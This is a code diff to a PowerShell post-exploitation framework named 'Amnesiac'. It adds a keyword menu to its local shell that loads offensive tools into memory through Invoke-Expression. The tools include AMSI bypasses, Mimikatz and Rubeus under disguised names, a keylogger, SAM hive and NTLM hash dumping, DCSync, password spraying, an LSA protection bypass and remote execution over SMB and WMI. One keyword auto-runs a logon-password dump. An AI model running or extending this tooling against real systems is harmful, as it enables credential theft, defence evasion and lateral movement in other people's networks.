@@ -1553,11 +1553,43 @@ exit
 function Start-LocalShell {
     $localFQDN  = try { [System.Net.Dns]::GetHostByName($env:COMPUTERNAME).HostName } catch { $env:COMPUTERNAME }
     $localUser  = if ($env:USERDOMAIN -and $env:USERDOMAIN -ne $env:COMPUTERNAME) { "$env:USERDOMAIN\$env:USERNAME" } else { $env:USERNAME }
-    $shortHost  = ($localFQDN -split '\.')[0]
+    $shortHost  = ($localFQDN -split '\.' )[0]
+
+    # Keyword -> cache tool(s) + optional auto-invoke expression
+    # tools: ordered cache keys to load; invoke: PS expression to run after (null = stay-loaded)
+    $_kw = @{
+        # Scripts Loading
+        'Patch'            = @{ tools=@('SimpleAMSI');                                           invoke=$null }
+        'PatchNet'         = @{ tools=@('NETAMSI');                                              invoke=$null }
+        'PInject'          = @{ tools=@('PInject');                                              invoke=$null }
+        'PowerView'        = @{ tools=@('pwv');                                                  invoke=$null }
+        'Mimi'             = @{ tools=@('Suntour');                                              invoke=$null }
+        'Rubeus'           = @{ tools=@('Ferrari');                                              invoke=$null }
+        # Local Actions
+        'Ask4Creds'        = @{ tools=@('Ask4Creds');                                            invoke=$null }
+        'AutoMimi'         = @{ tools=@('Suntour');                                              invoke='Mimi -Command "sekurlsa::logonpasswords"' }
+        'CredMan'          = @{ tools=@('cms');                                                  invoke='Enum-Creds' }
+        'Dpapi'            = @{ tools=@('Dpapi');                                                invoke=$null }
+        'HashGrab'         = @{ tools=@('SimpleAMSI','NETAMSI','Invoke-GrabTheHash');           invoke='Invoke-GrabTheHash' }
+        'Hive'             = @{ tools=@('HiveDump');                                             invoke='Invoke-HiveDump' }
+        'Kerb'             = @{ tools=@('dumper');                                               invoke=$null }
+        'Keylog'           = @{ tools=@('klg');                                                  invoke=$null }
+        'MultiRDP'         = @{ tools=@('TermsrvPatcher');                                       invoke=$null }
+        'Monitor'          = @{ tools=@('TGT_Monitor');                                          invoke=$null }
+        'PPL'              = @{ tools=@('ppl');                                                  invoke=$null }
+        # Domain Actions
+        'CredValidate'     = @{ tools=@('Validate-Credentials');                                 invoke=$null }
+        'DCSync'           = @{ tools=@('Sync');                                                 invoke=$null }
+        'Impersonation'    = @{ tools=@('Token-Impersonation');                                  invoke=$null }
+        'LocalAdminAccess' = @{ tools=@('Find-LocalAdminAccess');                                invoke=$null }
+        'PassSpray'        = @{ tools=@('PassSpray');                                            invoke=$null }
+        'Remoting'         = @{ tools=@('Invoke-SMBRemoting','Invoke-WMIRemoting');             invoke=$null }
+        'SessionHunter'    = @{ tools=@('Invoke-SessionHunter');                                 invoke=$null }
+    }
 
     Write-Output ""
-    Write-Host " [+] Local Shell — $localFQDN [$localUser]" -ForegroundColor Green
-    Write-Host " [*] Type 'help' to see available commands." -ForegroundColor Cyan
+    Write-Host " [+] Local Shell - $localFQDN [$localUser]" -ForegroundColor Green
+    Write-Host " [*] Type 'help' for available commands and tools." -ForegroundColor Cyan
     Write-Output ""
 
     while ($true) {
@@ -1571,26 +1603,54 @@ function Start-LocalShell {
 
         if ($cmd -eq 'help' -or $cmd -eq '?') {
             Write-Output ""
-            Write-Host " [+] Local Shell — Amnesiac Commands" -ForegroundColor Cyan
+            Write-Host " [+] Local Shell - Amnesiac Commands" -ForegroundColor Cyan
             Write-Output ""
-            Write-Host "  modules           " -NoNewline -ForegroundColor Yellow; Write-Host "List all tools in Amnesiac tool cache"
-            Write-Host "  load <name>       " -NoNewline -ForegroundColor Yellow; Write-Host "Import a cached tool into this session, then call its functions directly"
-            Write-Host "  help / ?          " -NoNewline -ForegroundColor Yellow; Write-Host "Show this help"
-            Write-Host "  back / exit       " -NoNewline -ForegroundColor Yellow; Write-Host "Return to session menu"
+            Write-Host " [+] Shell:" -ForegroundColor Green
+            Write-Host "   help / ?          " -NoNewline -ForegroundColor Yellow; Write-Host "This menu"
+            Write-Host "   modules           " -NoNewline -ForegroundColor Yellow; Write-Host "List all tools in cache (exact cache names for 'load')"
+            Write-Host "   load <name>       " -NoNewline -ForegroundColor Yellow; Write-Host "Load any cached tool by exact cache name"
+            Write-Host "   back / exit       " -NoNewline -ForegroundColor Yellow; Write-Host "Return to session menu"
             Write-Output ""
-            Write-Host " [*] Workflow:" -ForegroundColor Cyan
-            Write-Host "     1. 'modules'          — see what tools are available"
-            Write-Host "     2. 'load SimpleAMSI'  — load a tool (imports all its functions)"
-            Write-Host "     3. Run the functions   — e.g. Bypass-AMSI, Get-Domain, Invoke-SMBRemoting"
+            Write-Host " [+] Scripts Loading:" -ForegroundColor Green
+            Write-Host "   Patch             " -NoNewline -ForegroundColor Yellow; Write-Host "Load AMSI bypass (SimpleAMSI) - stays active this session"
+            Write-Host "   PatchNet          " -NoNewline -ForegroundColor Yellow; Write-Host "Load .NET AMSI bypass (NETAMSI)"
+            Write-Host "   PInject           " -NoNewline -ForegroundColor Yellow; Write-Host "Load process injection module"
+            Write-Host "   PowerView         " -NoNewline -ForegroundColor Yellow; Write-Host "Load PowerView - full AD enumeration (Get-Domain, Find-DomainUser, etc.)"
+            Write-Host "   Mimi              " -NoNewline -ForegroundColor Yellow; Write-Host "Load Mimikatz (Suntour) - use: Mimi -Command ""sekurlsa::logonpasswords"""
+            Write-Host "   Rubeus            " -NoNewline -ForegroundColor Yellow; Write-Host "Load Rubeus (Ferrari) - use: Rubeus -Command ""triage"""
             Write-Output ""
-            Write-Host " [*] Any other input is executed as PowerShell in this session." -ForegroundColor Cyan
+            Write-Host " [+] Local Actions:" -ForegroundColor Green
+            Write-Host "   Ask4Creds         " -NoNewline -ForegroundColor Yellow; Write-Host "Load credential harvesting module"
+            Write-Host "   AutoMimi          " -NoNewline -ForegroundColor Yellow; Write-Host "Load Mimikatz and dump logon credentials immediately"
+            Write-Host "   CredMan           " -NoNewline -ForegroundColor Yellow; Write-Host "Dump Windows Credential Manager (auto-runs Enum-Creds)"
+            Write-Host "   Dpapi             " -NoNewline -ForegroundColor Yellow; Write-Host "Load DPAPI decryption module - use: Invoke-DpapiDump"
+            Write-Host "   HashGrab          " -NoNewline -ForegroundColor Yellow; Write-Host "Load deps and dump current user NTLM hash (auto-runs)"
+            Write-Host "   Hive              " -NoNewline -ForegroundColor Yellow; Write-Host "Load and run SAM / SYSTEM / SECURITY hive dump (auto-runs)"
+            Write-Host "   Kerb              " -NoNewline -ForegroundColor Yellow; Write-Host "Load Kerberos TGT dumper - use: Invoke-Kirby"
+            Write-Host "   Keylog            " -NoNewline -ForegroundColor Yellow; Write-Host "Load keylogger - use: KeyLog ""C:\path\log.txt"""
+            Write-Host "   Monitor           " -NoNewline -ForegroundColor Yellow; Write-Host "Load TGT monitor - use: TGT_Monitor"
+            Write-Host "   MultiRDP          " -NoNewline -ForegroundColor Yellow; Write-Host "Load termsrv.dll patcher for concurrent RDP sessions"
+            Write-Host "   PPL               " -NoNewline -ForegroundColor Yellow; Write-Host "Load LSA Protection bypass - use: Invoke-PPLKiller"
+            Write-Output ""
+            Write-Host " [+] Domain Actions:" -ForegroundColor Green
+            Write-Host "   CredValidate      " -NoNewline -ForegroundColor Yellow; Write-Host "Load credential validation - use: Validate-Credentials"
+            Write-Host "   DCSync            " -NoNewline -ForegroundColor Yellow; Write-Host "Load DCSync module - use: Invoke-DCSync"
+            Write-Host "   Impersonation     " -NoNewline -ForegroundColor Yellow; Write-Host "Load token impersonation module - use: Token-Impersonation"
+            Write-Host "   LocalAdminAccess  " -NoNewline -ForegroundColor Yellow; Write-Host "Find machines where current user has local admin"
+            Write-Host "   PassSpray         " -NoNewline -ForegroundColor Yellow; Write-Host "Load domain password spray - use: Invoke-PassSpray"
+            Write-Host "   Remoting          " -NoNewline -ForegroundColor Yellow; Write-Host "Load SMB + WMI remoting - use: Invoke-SMBRemoting / Invoke-WMIRemoting"
+            Write-Host "   SessionHunter     " -NoNewline -ForegroundColor Yellow; Write-Host "Load and hunt active user sessions on domain machines"
+            Write-Output ""
+            Write-Host " [*] Scenario 1: started via 'runas /netonly', all domain tools" -ForegroundColor DarkCyan
+            Write-Host "     (PowerView, SessionHunter, PassSpray, etc.) automatically use" -ForegroundColor DarkCyan
+            Write-Host "     your domain credentials for LDAP and SMB." -ForegroundColor DarkCyan
             Write-Output ""
             continue
         }
 
         if ($cmd -eq 'modules') {
             if ($global:ToolCache.Count -eq 0) {
-                Write-Host " [-] Tool cache empty — run 'modules reload' from main menu first." -ForegroundColor Red
+                Write-Host " [-] Tool cache empty - run 'modules reload' from main menu first." -ForegroundColor Red
             } else {
                 Write-Output ""
                 $global:ToolCache.Keys | Sort-Object | ForEach-Object { Write-Host "  [+] $_" }
@@ -1599,13 +1659,54 @@ function Start-LocalShell {
             continue
         }
 
+        # Keyword tool loader
+        $kwMatch = $_kw.Keys | Where-Object { $_ -ieq $cmd } | Select-Object -First 1
+        if ($kwMatch) {
+            $kwDef  = $_kw[$kwMatch]
+            $allOk  = $true
+            $before = @(Get-Command -CommandType Function | Select-Object -ExpandProperty Name)
+            foreach ($toolName in $kwDef.tools) {
+                $cacheKey = $global:ToolCache.Keys | Where-Object { $_ -ieq $toolName } | Select-Object -First 1
+                if ($cacheKey) {
+                    try   { Invoke-Expression $global:ToolCache[$cacheKey] }
+                    catch { Write-Host " [-] Failed to load ${toolName}: $($_.Exception.Message)" -ForegroundColor Red; $allOk = $false }
+                } else {
+                    Write-Host " [-] '$toolName' not in cache. Run 'modules reload' or 'serve' from main menu." -ForegroundColor Red
+                    $allOk = $false
+                }
+            }
+            if ($allOk) {
+                Write-Host " [+] $kwMatch loaded." -ForegroundColor Green
+                $after    = @(Get-Command -CommandType Function | Select-Object -ExpandProperty Name)
+                $newFuncs = @($after | Where-Object { $before -notcontains $_ })
+                if ($newFuncs.Count -gt 0) {
+                    $cap = if ($newFuncs.Count -le 12) { $newFuncs -join ', ' } else { ($newFuncs[0..11] -join ', ') + " ... (+$($newFuncs.Count - 12) more)" }
+                    Write-Host " [*] Available: $cap" -ForegroundColor Cyan
+                }
+                if ($kwDef.invoke) {
+                    Write-Output ""
+                    try   { Invoke-Expression $kwDef.invoke }
+                    catch { Write-Host " [-] Auto-invoke failed: $($_.Exception.Message)" -ForegroundColor Red }
+                }
+            }
+            continue
+        }
+
+        # Explicit load by exact cache name
         if ($cmd -match '^load\s+(.+)') {
-            $modName = $Matches[1].Trim()
-            $key = $global:ToolCache.Keys | Where-Object { $_ -ieq $modName } | Select-Object -First 1
-            if ($key) {
+            $modName  = $Matches[1].Trim()
+            $cacheKey = $global:ToolCache.Keys | Where-Object { $_ -ieq $modName } | Select-Object -First 1
+            if ($cacheKey) {
+                $before = @(Get-Command -CommandType Function | Select-Object -ExpandProperty Name)
                 try {
-                    Invoke-Expression $global:ToolCache[$key]
-                    Write-Host " [+] $key loaded." -ForegroundColor Green
+                    Invoke-Expression $global:ToolCache[$cacheKey]
+                    Write-Host " [+] $cacheKey loaded." -ForegroundColor Green
+                    $after    = @(Get-Command -CommandType Function | Select-Object -ExpandProperty Name)
+                    $newFuncs = @($after | Where-Object { $before -notcontains $_ })
+                    if ($newFuncs.Count -gt 0) {
+                        $cap = if ($newFuncs.Count -le 12) { $newFuncs -join ', ' } else { ($newFuncs[0..11] -join ', ') + " ... (+$($newFuncs.Count - 12) more)" }
+                        Write-Host " [*] Available: $cap" -ForegroundColor Cyan
+                    }
                 } catch {
                     Write-Host " [-] Load error: $($_.Exception.Message)" -ForegroundColor Red
                 }
@@ -1623,7 +1724,6 @@ function Start-LocalShell {
         }
     }
 }
-
 function Display-SessionMenu {
 	
 	#for ($i=0; $i -lt $host.UI.RawUI.WindowSize.Height; $i++) {Write-Output ""}
